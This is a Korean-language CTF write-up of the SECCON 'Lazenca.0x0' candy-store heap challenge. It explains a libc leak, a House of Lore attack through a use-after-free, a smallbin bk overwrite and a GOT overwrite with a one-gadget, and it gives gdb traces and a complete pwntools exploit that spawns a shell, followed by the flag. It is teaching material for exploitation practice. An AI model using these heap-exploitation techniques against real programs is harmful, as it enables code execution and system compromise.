  * malloc()는 이때 해제된 사탕 정보(0x20) 영역, 사탕 설명(0x90) 영역을 하나의 영역(0xb0)으로 변경합니다.
  * malloc()는 Heap 영역(1200 byte)을 할당으로 인해 해당 영역을 Small bin에 저장합니다.
  + 해당 Free chunk의 fd,bk 영역에 Small bin의 주소가 저장됩니다.

```bash title="debugging"
gdb-peda$ parseheap 
addr                prev                size                 status              fd                bk                
0xa17000            0x0                 0x90                 Used                None              None
0xa17090            0x0                 0x410                Used                None              None
0xa174a0            0x0                 0x20                 Used                None              None
0xa174c0            0x0                 0x20                 Used                None              None
0xa174e0            0x0                 0x20                 Used                None              None
0xa17500            0x0                 0x20                 Used                None              None
0xa17520            0x0                 0x20                 Used                None              None
0xa17540            0x0                 0x20                 Used                None              None
0xa17560            0x0                 0x20                 Used                None              None
0xa17580            0x0                 0x20                 Used                None              None
0xa175a0            0x0                 0x20                 Used                None              None
0xa175c0            0x0                 0x20                 Used                None              None
0xa175e0            0x0                 0x20                 Used                None              None
0xa17600            0x100006567         0xb0                 Freed     0x7ff5052a2c18    0x7ff5052a2c18
0xa176b0            0xb0                0x20                 Used                None              None
0xa176d0            0x100006567         0x4c0                Used                None              None
gdb-peda$ p main_arena.bins[20]
$6 = (mchunkptr) 0xa17600
gdb-peda$ p main_arena.bins[21]
$7 = (mchunkptr) 0xa17600
gdb-peda$
```

* **다음과 같은 Heap 구조입니다.**

|  | Addresss | State | Heap size | fd | bk |
| --- | --- | --- | --- | --- | --- |
| Order list[0] | 0xa175e0 | A | 0x20 | None | None |
| 창고에 저장된 사탕 & 사탕 설명 | 0xa17600 | F | 0xb0 | 0x7ff5052a2c18 | 0x7ff5052a2c18 |
| Order list[1] | 0xa176b0 | A | 0x20 | None | None |
| 구매한 사탕 평가 | 0xa176d0 | A | 0x4c0 | None | None |

* **다음과 같은 방법으로 Libc addresss를 추출 할 수 있습니다.**
  + 유저는 1개의 사탕을 Order list에 추가 합니다.  
    - Order list에 추가 된 사탕의 정보는 하나의 영역(0xb0)으로 변경 영역에 할당됩니다.
  + 유저는 Order list의 내용을 출력해 Libc addresss를 추출 할 수 있습니다.

```bash title="Leak Libc address"
Please pick up the candies to order.
>$ 1

=*= Order list =*=
Order code  : 4
Order count : 10
Order candy : Orange
Candy code  : 1

Order code  : 5
Order count : 10
Order candy : Orange
Candy code  : 1

Order code  : 6L\xb0\x0c\x85\x7f
Order count : 10
Order candy : Orange
Candy code  : 1

Order candy.
1) Order List
2) Add to Order List
3) Cancel one's order.
4) Order candy
5) Exit
Command : $
```

```bash title="Leak Libc address - debugging"
gdb-peda$ parseheap 
addr                prev                size                 status              fd                bk                
0xa17000            0x0                 0x90                 Used                None              None
0xa17090            0x0                 0x410                Used                None              None
0xa174a0            0x0                 0x20                 Used                None              None
0xa174c0            0x0                 0x20                 Used                None              None
0xa174e0            0x0                 0x20                 Used                None              None
0xa17500            0x0                 0x20                 Used                None              None
0xa17520            0x0                 0x20                 Used                None              None
0xa17540            0x0                 0x20                 Used                None              None
0xa17560            0x0                 0x20                 Used                None              None
0xa17580            0x0                 0x20                 Used                None              None
0xa175a0            0x0                 0x20                 Used                None              None
0xa175c0            0x0                 0x20                 Used                None              None
0xa175e0            0x0                 0x20                 Used                None              None
0xa17600            0x100006567         0x20                 Used     			 None    		   None
0xa17620            0x100006567         0x90                 Freed     0x7ff5052a2c18    0x7ff5052a2c18
0xa176b0            0x90                0x20                 Used                None              None
0xa176d0            0x100006567         0x4c0                Used                None              None
gdb-peda$ x/4gx 0xa17600
0xa17600:	0x0000000100006567	0x0000000000000021
0xa17610:	0x00007ff5052a2c36	0x6e61724f0000000a
gdb-peda$
```

* **다음과 같은 Heap 구조입니다.**

|  | Addresss | State | Heap size | fd | bk |
| --- | --- | --- | --- | --- | --- |
| Order list[0] | 0xa175e0 | A | 0x20 | None | None |
| Order list[2] | 0xa17600 | A | 0x20 | None | None |
| 창고에 저장된 사탕 & 사탕 설명(Unsorted bin) | 0xa17620 | F | 0x90 | 0x7ff5052a2c18 | 0x7ff5052a2c18 |
| Order list[1] | 0xa176b0 | A | 0x20 | None | None |
| 구매한 사탕 평가 | 0xa176d0 | A | 0x4c0 | None | None |

* **다음과 같은 스크립트를 이용해 Libc addresss를 추출 할 수 있습니다.**

```python title="LeakLibcAddress.py"
from pwn import *
#context.log_level = 'debug'

def login(id,pw):
    p.recvuntil('Enter your ID.')
    p.send(id)
    p.recvuntil('Enter your Password.')
    p.send(pw)

def setOrderlist(num):
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('Command : ')
    p.send('2')
    p.recvuntil('Please pick up the candies to order.')
    p.send(num)
    p.recvuntil('Command : ')
    p.send('5')

def getOrderlist():
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('Command : ')
    p.send('1')

def setOrder(price,desc):
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('0) Yes, 1) No')
    p.send('0')
    p.recvuntil('Enter the price of ')
    p.sendline(price)
    p.recvuntil('Enter a description of the')
    p.send(desc)
    p.recvuntil('Command : ')
    p.send('5')

def purchase(code,num,comment):
    p.recvuntil('Command : ')
    p.send('2')
    p.recvuntil('Please enter the code number of the candy to be purchased.')
    p.send(code)
    p.recvuntil('Please enter the number of the candy to purchase.')
    p.send(num)
    p.recvuntil('Please enter a comment for candy.')
    p.send(comment)

bin = ELF('./Lazenca.0x0')
p = remote('n8.pwn.tk.seccon.spica.bz',9999)

login('Admin','admin')

setOrderlist('1')
setOrder('10','TEST')

setOrderlist('1')
setOrderlist('1')

purchase('0','10','AA')

setOrderlist('1')

getOrderlist()

p.recvuntil('Order code  : ')
p.recvuntil('Order code  : ')
p.recvuntil('Order code  : ')
p.recv(1)
tmp = p.recv(5)
tmp = '\x00' + tmp
libcLeak = u64(tmp.ljust(8,'\x00'))
libcBase = libcLeak - 0x3c4c00
execve = libcBase + 0xF0274

log.info("Libc leak : " + hex(libcLeak))
log.info("Libc base: " + hex(libcBase))
log.info("execve : " + hex(execve))

p.recvuntil('Command : ')
p.send('5')
```

#### **House of lore(Fake chunk)**

* **다음과 같이 **"gAccount[1].fd" 영역에 할당되었던 공간을 "dest->candyDescription"영역에 재할당 받아야 합니다.****
  + 동일한 영역을 할당받기 위해 미리 Heap 구조를 설계해야 합니다.
    - Order list의 0번째 사탕 취소
    - 사탕 주문 완료
  + 2개의 새로운 계정을 생성합니다.
* **Heap area structure**

|  | Addresss | State | Heap size | fd | bk |
| --- | --- | --- | --- | --- | --- |
| 창고에 저장된 0번 사탕 정보 | 0xa175e0 | A | 0x20 | 0x0 | None |
| Order list[2] | 0xa17600 | F | 0x20 | None | None |
| 창고에 저장된 0번 사탕 설명 | 0xa17620 | A | 0x90 | 0xa17600 | None |
| Order list[1] | 0xa176b0 | F | 0x20 | None | None |
| 구매한 사탕 평가 | 0xa176d0 | A | 0x4c0 | None | None |
| gAccount[1].fd | 0xA17B90 | A | 0x90 | None | None |
| gAccount[2].fd | 0xA17c20 | A | 0x90 | None | None |

* **다음과 같이 House of lore에 필요한 Fake chunk를 생성할 수 있습니다.**  
  + 생성한 계정을 이용해 다음과 같이 충전이 필요합니다.
    - 2번째 계정 : 6308456(0x604268)
    - 3번째 계정 : 6308416(0x604240)
  + 2번째 계정을 삭제 합니다.
* **다음과 같은 gAccount[] 구조를 가지게 됩니다.**

```bash title="Heap Structure" 
gdb-peda$ x/8gx 0x604240
0x604240:	0x0000000000000000	0x0000000000000002
0x604250:	0x0000000001a08b90	0x0000000000604268
0x604260:	0x0000000000000003	0x0000000000000003
0x604270:	0x0000000001a08c30	0x0000000000604240
gdb-peda$
```

* **gAccount area structure**

|  |  |  |
| --- | --- | --- |
| 0x604240 | gAccount[1].state | gAccount[1].number |
| 0x604250 | gAccount[1].fd = 0xA17B90 | gAccount[1].bk = 0x604268 |
| 0x604260 | gAccount[2].state | gAccount[2].number |
| 0x604270 | gAccount[2].fd | gAccount[2].bk = 0x604240 |

* **다음과 같은 Heap 구조를 가지게 됩니다.**

```bash title="Heap Structure - debugging" 
gdb-peda$ parseheap 
addr                prev                size                 status              fd                bk                
0xa17000            0x0                 0x90                 Used                None              None
0xa17090            0x0                 0x410                Used                None              None
0xa174a0            0x0                 0x20                 Used                None              None
0xa174c0            0x0                 0x20                 Used                None              None
0xa174e0            0x0                 0x20                 Used                None              None
0xa17500            0x0                 0x20                 Used                None              None
0xa17520            0x0                 0x20                 Used                None              None
0xa17540            0x0                 0x20                 Used                None              None
0xa17560            0x0                 0x20                 Used                None              None
0xa17580            0x0                 0x20                 Used                None              None
0xa175a0            0x0                 0x20                 Used                None              None
0xa175c0            0x0                 0x20                 Used                None              None
0xa175e0            0x0                 0x20                 Used                None              None
0xa17600            0xa17630         	0x20                 Freed     			  0x0    		   None
0xa17620            0x100006567         0x90                 Used      			 None    		   None
0xa176b0            0x90                0x20                 Freed           0xa17600              None
0xa176d0            0x100006567         0x4c0                Used                None              None
0xa17b90            0x0			        0x90                 Freed     0x7ff5052a2b78              0x7ff5052a2b78
0xa17c20            0x90         		0x90                 Used                None              None
gdb-peda$
```

* **Heap area structure**

|  | Addresss | State | Heap size | fd | bk |
| --- | --- | --- | --- | --- | --- |
| 창고에 저장된 0번 사탕 정보 | 0xa175e0 | A | 0x20 | None | None |
| Order list[2] | 0xa17600 | F | 0x20 | 0x0 | None |
| 창고에 저장된 0번 사탕 설명 | 0xa17620 | A | 0x90 | None | None |
| Order list[1] | 0xa176b0 | F | 0x20 | 0xa17600 | None |
| 구매한 사탕 평가 | 0xa176d0 | A | 0x4c0 | None | None |
| gAccount[1].fd(Unsortbin) | 0xA17B90 | F | 0x90 | 0x7ff5052a2b78 | 0x7ff5052a2b78 |
| gAccount[2].fd | 0xA17c20 | A | 0x90 | None | None |

#### **House of lore(Overwrite Smallbin bk)**

* **우선 공격자는 bk 영역을 덮어 쓰기 위해서 다음과 같이 "gAccount[1].fd→state"의 값을 조작해야 합니다.**
* **공격자는 다음과 같이 UAF 취약성을 사용할 수 있습니다.**  
  + Order list에 새로운 사탕을 추가하고, 주문을 완료합니다.  
    - 이때 "dest→candyDescription" 영역에 "gAccount[1].fd + 0x10" 영역의 주소가 저장됩니다.
      * 해당 영역에 16이상의 문자를 저장합니다.
  + 다음과 같이 "gAccount[1].fd→state" 값을 변경됩니다.

```
gdb-peda$ x/6gx 0x0000000002593b90
0xA17B90:	0x0000000000000000	0x0000000000000091
0xa17ba0:	0x4141414141414141	0x4141414141414141
0xa17bb0:	0x4141414141414141	0x0000000000000000
gdb-peda$
```

* **Heap area structure**

|  | Addresss | State | Heap size | fd | bk |
| --- | --- | --- | --- | --- | --- |
| 창고에 저장된 0번 사탕 정보 | 0xa175e0 | A | 0x20 | None | None |
| Order list[0] | 0xa17600 | A | 0x20 | None | None |
| 창고에 저장된 0번 사탕 설명 | 0xa17620 | A | 0x90 | None | None |
| 창고에 저장된 1번 사탕 정보 | 0xa176b0 | F | 0x20 | 0x0 | None |
| 구매한 사탕 평가 | 0xa176d0 | A | 0x4c0 | None | None |
| 창고에 저장된 1번 사탕 설명 | 0xA17B90 | A | 0x90 | None | None |
| gAccount[2].fd | 0xA17c20 | A | 0x90 | None | None |

* **다음과 같이 1번 사탕을 구매하여 0xA17B90 영역이 Smallbin에 등록되도록 합니다.**
  + 0xA17B90 영역이 Smallbin[16], [17]에 등록되었습니다.

```bash title="Heap Structure - debugging" 
gdb-peda$ parseheap 
addr                prev                size                 status              fd                bk                
0xa17000            0x0                 0x90                 Used                None              None
0xa17090            0x0                 0x410                Used                None              None
0xa174a0            0x0                 0x20                 Used                None              None
0xa174c0            0x0                 0x20                 Used                None              None
0xa174e0            0x0                 0x20                 Used                None              None
0xa17500            0x0                 0x20                 Used                None              None
0xa17520            0x0                 0x20                 Used                None              None
0xa17540            0x0                 0x20                 Used                None              None
0xa17560            0x0                 0x20                 Used                None              None
0xa17580            0x0                 0x20                 Used                None              None
0xa175a0            0x0                 0x20                 Used                None              None
0xa175c0            0x0                 0x20                 Used                None              None
0xa175e0            0x0                 0x20                 Used                None              None
0xa17600            0xa17630         	0x20                 Freed     0x7ff5052a2b88    	   0xa176b0
0xa17620            0x100006567         0x90                 Used      			 None    		   None
0xa176b0            0x90                0x20                 Freed           0xa17600    0x7ff5052a2b88
0xa176d0            0x100006567         0x4c0                Used                None              None
0xa17b90            0x0			        0x90                 Freed     0x7ff5052a2bf8	 0x7ff5052a2bf8
0xa17c20            0x90         		0x90                 Used                None              None
0xa17cb0            0x90         		0x4c0                Used                None              None
gdb-peda$ p main_arena.bins[16]
$1 = (mchunkptr) 0xa17b90
gdb-peda$ p main_arena.bins[17]
$2 = (mchunkptr) 0xa17b90
gdb-peda$
```

* **Heap area structure**

|  | Addresss | State | Heap size | fd | bk |
| --- | --- | --- | --- | --- | --- |
| 창고에 저장된 0번 사탕 정보 | 0xa175e0 | A | 0x20 | None | None |
| Order list[0] | 0xa17600 | A | 0x20 | 0x7ff5052a2b88 | 0xa176b0 |
| 창고에 저장된 0번 사탕 설명 | 0xa17620 | A | 0x90 | None | None |
| 창고에 저장된 1번 사탕 정보 | 0xa176b0 | F | 0x20 | 0xa176b0 | 0x7ff5052a2b88 |
| 구매한 사탕 평가 | 0xa176d0 | A | 0x4c0 | None | None |
| 창고에 저장된 1번 사탕 설명 | 0xA17B90 | A | 0x90 | 0x7ff5052a2bf8 | 0x7ff5052a2bf8 |
| gAccount[2].fd | 0xA17c20 | A | 0x90 | None | None |
| 구매한 사탕 평가 | 0xa17cb0 | A | 0x4c0 | None | None |

* **다음과 같이 2번 계정의 비밀번호 변경을 통해 bk영역의 값을 계속 변경 할 수있습니다.**
  + bk 영역에 첫번째 Fake chunk 의 시작 주소를 저장하였습니다.

```bash title="Heap Structure - debugging" 
gdb-peda$ x/6gx 0x9d4b90
0xA17B90:	0x0000000000000000	0x0000000000000091
0xa17ba0:	0x00007f91951a6bf8	0x0000000000604240
0xa17bb0:	0x4141414141414141	0x0000000000000000
gdb-peda$
```

* **다음과 같은 방법으로 main\_arena.bins[17] 영역에 gAccount[1]의 주소 값을 저장 할 수 있습니다.**
  + 공격자는 Order list에 사탕을 추가하고, 주문을 완료합니다.

```bash title="Overwrite Smallbin bk" 
gdb-peda$ p main_arena.bins[16]
$3 = (mchunkptr) 0xA17B90
gdb-peda$ p main_arena.bins[17]
$4 = (mchunkptr) 0x604240
gdb-peda$
```

* **다음과 같이 gAccount[] 영역을 할당 받을 수 있습니다.**
  + 조금 전에 추가한 사탕을 모두 구매합니다.
  + 공격자는 Order list에 사탕을 추가하고, 주문을 완료합니다.
    - 이때 캔디 설명을 입력 받는 영역으로 gAccount[1].fd영역이 할당됩니다.
    - 다음과 같은 방법으로 원하는 영역의 값을 변경 할 수 있습니다.
      * gAccount[1].fd = "접근을 원하는 영역의 주소" - 0x18
      * 2번째 계정의 비밀번호 변경을 사용해 "접근을 원하는 영역"에 사용자 입력값을 저장할 수 있습니다.

```bash title="Overwrite gAccount1.fd - debugging" 
Breakpoint 1, 0x000000000040123a in ?? ()
gdb-peda$ ni
0x000000000040123f in ?? ()
gdb-peda$ i r rax
rax            0x604250	0x604250
gdb-peda$ x/4gx 0x604250
0x604250:	0x00007f070160bbf8	0x0000000000604268
0x604260:	0x0000000000000003	0x0000000000000003
Breakpoint 2, 0x000000000040125f in ?? ()
gdb-peda$ x/4gx 0x604250
0x604250:	0x0a41414141414141	0x0000000000604268
0x604260:	0x0000000000000003	0x0000000000000003
gdb-peda$
```

#### **One Gadget**

* **다음과 같은 One Gadget을 사용할 수 있습니다.**
  + 해당 Gadget을 fflush.got영역에 덮어쓰면 Shell을 획득 할 수 있습니다.

```asm title="One Gadget" 
.text:00000000000F0274                 mov     rax, cs:environ_ptr_0
.text:00000000000F027B                 lea     rsi, [rsp+1B8h+var_168]
.text:00000000000F0280                 lea     rdi, aBinSh     ; "/bin/sh"
.text:00000000000F0287                 mov     rdx, [rax]
.text:00000000000F028A                 call    execve
```

## **Exploit Code**

```python title="pwn-online-candy-store.py" 
from pwn import *
#context.log_level = 'debug'

gAccount1bk = 0x604240
gAccount2fd = 0x604268

def fill(addr):
    tmp = int(addr)

    log.info('Original addresss(int) : ' + str(tmp) + ', (hex) : ' + hex(tmp))

    tmp -= 10000

    log.info('Addresss - 10000(int) : ' + str(tmp) + ', (hex) : ' + hex(tmp))

    tmp = str(tmp)
    for i in range(5):
        for j in range(int(tmp[6-i])):
            charge(str(i)) 

    for i in range(int(tmp[0:2])):
        charge('5')

def setAccount(id):
    p.recvuntil('Enter your ID.')
    p.send('a')
    p.recvuntil('Enter your Password.')
    p.send('a')
    p.recvuntil('Create an account?')
    p.send('0')
    p.recvuntil('Enter your New ID.')
    p.send(id)
    p.recvuntil('Enter your New Password.')
    p.send(id)
    p.recvuntil('Enter your profile.')
    p.send('TEST')

def login(id,pw):
    p.recvuntil('Enter your ID.')
    p.send(id)
    p.recvuntil('Enter your Password.')
    p.send(pw)

def logout():
    p.recvuntil('Command : ')
    p.send('9')
    p.recvuntil('1) No')
    p.send('0')

def delAccount(num):
    p.recvuntil('Command : ')
    p.send('5')
    p.recvuntil('Command : ')
    p.send('1')
    p.recvuntil('Please enter the number of the account you want to delete')
    p.send(num)
    p.recvuntil('Command : ')
    p.send('3')

def pwChange(num,pw):
    p.recvuntil('Command : ')
    p.send('5')
    p.recvuntil('Command : ')
    p.send('2')
    p.recvuntil('Please enter the number of the account you want to change PW')
    p.send(num)
    p.recvuntil('Enter your New Password.')
    p.send(pw)
    p.recvuntil('Command : ')
    p.send('3')

def charge(num):
    p.recvuntil('Command : ')
    p.send('3')
    p.recvuntil('5) 100000')
    p.send(num)

def setOrderlist(num):
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('Command : ')
    p.send('2')
    p.recvuntil('Please pick up the candies to order.')
    p.send(num)
    p.recvuntil('Command : ')
    p.send('5')

def delOrderlist():
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('Command : ')
    p.send('3')
    p.recvuntil('Candy code: ')
    p.send('0')
    p.recvuntil('Command : ')
    p.send('5')

def getOrderlist():
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('Command : ')
    p.send('1')

def setOrder(price,desc):
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('0) Yes, 1) No')
    p.send('0')
    p.recvuntil('Enter the price of ')
    p.sendline(price)
    p.recvuntil('Enter a description of the')
    p.send(desc)
    p.recvuntil('Command : ')
    p.send('5')

def purchase(code,num,comment):
    p.recvuntil('Command : ')
    p.send('2')
    p.recvuntil('Please enter the code number of the candy to be purchased.')
    p.send(code)
    p.recvuntil('Please enter the number of the candy to purchase.')
    p.send(num)
    p.recvuntil('Please enter a comment for candy.')
    p.send(comment)

bin = ELF('./Lazenca.0x0')
p = remote('n8.pwn.tk.seccon.spica.bz',9999)

signal = bin.got['signal']

login('Admin','admin')

setOrderlist('1')
setOrder('10','TEST')

setOrderlist('1')
setOrderlist('1')

purchase('0','10','AA')

setOrderlist('1')

getOrderlist()

p.recvuntil('Order code  : ')
p.recvuntil('Order code  : ')
p.recvuntil('Order code  : ')
p.recv(1)
tmp = p.recv(5)
tmp = '\x00' + tmp
libcLeak = u64(tmp.ljust(8,'\x00'))
libcBase = libcLeak - 0x3c4c00
execve = libcBase + 0xF0274

log.info("Libc leak : " + hex(libcLeak))
log.info("Libc base: " + hex(libcBase))
log.info("execve : " + hex(execve))

p.recvuntil('Command : ')
p.send('5')

#Design heap
delOrderlist()

setOrder('20','BB')

logout()

#Create account 1
setAccount('asdf')
login('asdf','asdf')
fill(gAccount2fd)
logout()

#Create account 2
setAccount('qwer')
login('qwer','qwer')
fill(gAccount1bk)
logout()

#Set gAccount[1].fd->state
login('Admin','admin')

delAccount('2')

setOrderlist('0')
setOrder('1','A'*24)

#register bins[16,17]
purchase('1','10','AA')

#Overwrite Smallbin bk
pwChange('2',p64(gAccount1bk))

setOrderlist('3')
setOrder('1','A'*24)

purchase('1','10','AA')

#Overwrite gAccount[1].fd
setOrderlist('2')
setOrder('1',p64(signal))

#Overwrite fflush.got
p.recvuntil('Command : ')
p.send('5')
p.recvuntil('Command : ')
p.send('2')
p.recvuntil('Please enter the number of the account you want to change PW')
p.send('2')
p.recvuntil('Enter your New Password.')
p.send(p64(execve))

#Get shell
p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag | SECCON&#123;Y0u h4ve 4cquired the "H0use 0f L0re" techn0l0gy. by Lazenca.0x0&#125; |

## **Related Site**

* <https://gist.github.com/Charo-IT/aae574aef2145d454e196a9842cad4b5>